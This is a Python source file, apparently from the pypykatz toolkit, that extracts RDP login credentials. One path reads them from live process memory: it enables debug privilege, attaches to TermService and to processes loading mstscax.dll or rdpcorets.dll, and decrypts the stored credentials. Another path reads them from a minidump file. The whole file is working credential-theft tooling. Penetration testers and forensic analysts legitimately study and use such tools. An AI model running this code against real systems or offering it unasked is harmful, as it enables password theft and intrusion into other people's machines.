
import platform
from pypykatz import logger
from minidump.minidumpfile import MinidumpFile
from pypykatz.commons.common import KatzSystemInfo
from pypykatz.rdp.packages.creds.templates import RDPCredsTemplate
from pypykatz.rdp.packages.creds.decryptor import RDPCredentialDecryptorLogonpasswords, RDPCredentialDecryptorMstsc

class RDPCredParser:
	def __init__(self, process, reader, sysinfo, rdp_module, find_first=False, lower_bound=0, upper_bound=-1):
		self.process = process
		self.reader = reader
		self.sysinfo = sysinfo
		self.credentials = []
		self.rdp_module = rdp_module
		self.find_first = find_first
		self.lower_bound = lower_bound
		self.upper_bound = upper_bound
	
	@staticmethod
	def go_live(pid = None, all_rdp = False, live_rdp_module = None):
		if platform.system() != 'Windows':
			raise Exception('Live parsing will only work on Windows')
		from pypykatz.commons.readers.local.common.live_reader_ctypes import OpenProcess, PROCESS_ALL_ACCESS
		from pypykatz.commons.winapi.machine import LiveMachine
		from pypykatz.commons.winapi.constants import PROCESS_VM_READ , PROCESS_VM_WRITE , PROCESS_VM_OPERATION , PROCESS_QUERY_INFORMATION , PROCESS_CREATE_THREAD
		from pypykatz.commons.readers.local.common.privileges import enable_debug_privilege
		from pypykatz.commons.readers.local.live_reader import LiveReader
		from pypykatz.commons.readers.local.process import Process
		req_access_rights = PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD

		enable_debug_privilege()
		targets = []

		if pid is not None:
			process = Process(pid=pid, access = req_access_rights )
			process.list_modules()
			reader = LiveReader(process_handle=process.phandle)
			sysinfo = KatzSystemInfo.from_live_reader(reader)
			targets.append(RDPCredParser(process, reader.get_buffered_reader(), sysinfo, live_rdp_module))
			
		else:
			machine = LiveMachine()

			if live_rdp_module == "logonpasswords" and all_rdp is False:
				for service_name, display_name, pid in machine.list_services():
					if service_name == 'TermService':
						process = Process(pid=pid, access = req_access_rights )
						reader = LiveReader(process_handle=process.phandle)
						sysinfo = KatzSystemInfo.from_live_reader(reader)
						targets.append(RDPCredParser(process, reader.get_buffered_reader(), sysinfo, live_rdp_module))

			if live_rdp_module == "mstsc" and all_rdp is False:
				for pid in machine.list_all_pids():
					try:
						process = Process(pid=pid, access = req_access_rights )
						for module in process.list_modules():
							if module.name.lower().find("mstscax.dll") != -1:
								reader = LiveReader(process_handle=process.phandle)
								sysinfo = KatzSystemInfo.from_live_reader(reader)
								targets.append(RDPCredParser(process, reader.get_buffered_reader(), sysinfo, live_rdp_module))
								break
					except Exception as e:
						#import traceback
						#traceback.print_exc()
						pass
					if len(targets):
						break

			if all_rdp is True:
				for pid in machine.list_all_pids():
					try:
						process = Process(pid=pid, access = req_access_rights )
						for module in process.list_modules():
							if module.name.lower().find("mstscax.dll") != -1 or module.name.lower().find("rdpcorets.dll") != -1:
								reader = LiveReader(process_handle=process.phandle)
								sysinfo = KatzSystemInfo.from_live_reader(reader)
								targets.append(RDPCredParser(process, reader.get_buffered_reader(), sysinfo, live_rdp_module))
								break
					except Exception as e:
						#import traceback
						#traceback.print_exc()
						print(e)
		
		for target in targets:
			target.start()
		return targets

	@staticmethod
	def parse_minidump_file(filename, rdp_module, chunksize = 10*1024):
		try:
			minidump = MinidumpFile.parse(filename)
			reader = minidump.get_reader().get_buffered_reader(segment_chunk_size=chunksize)
			sysinfo = KatzSystemInfo.from_minidump(minidump)
		except Exception as e:
			logger.exception('Minidump parsing error!')
			raise e
		try:
			mimi = RDPCredParser(None, reader, sysinfo, rdp_module)
			mimi.start()
		except Exception as e:
			logger.info('Credentials parsing error!')
			raise e
		return [mimi]

	def rdpcreds(self):
		if self.rdp_module == "logonpasswords":
			decryptor_template = RDPCredsTemplate.get_logonpasswords_template(self.sysinfo)
			decryptor = RDPCredentialDecryptorLogonpasswords(self.process, self.reader, decryptor_template, self.sysinfo, find_first=self.find_first, lower_bound=self.lower_bound, upper_bound=self.upper_bound)
		else: # mstsc
			decryptor_template = RDPCredsTemplate.get_mstsc_template()
			decryptor = RDPCredentialDecryptorMstsc(self.process, self.reader, decryptor_template, self.sysinfo, find_first=self.find_first)

		decryptor.start()

		for cred in decryptor.credentials:
			self.credentials.append(cred)

	def start(self):
		self.rdpcreds()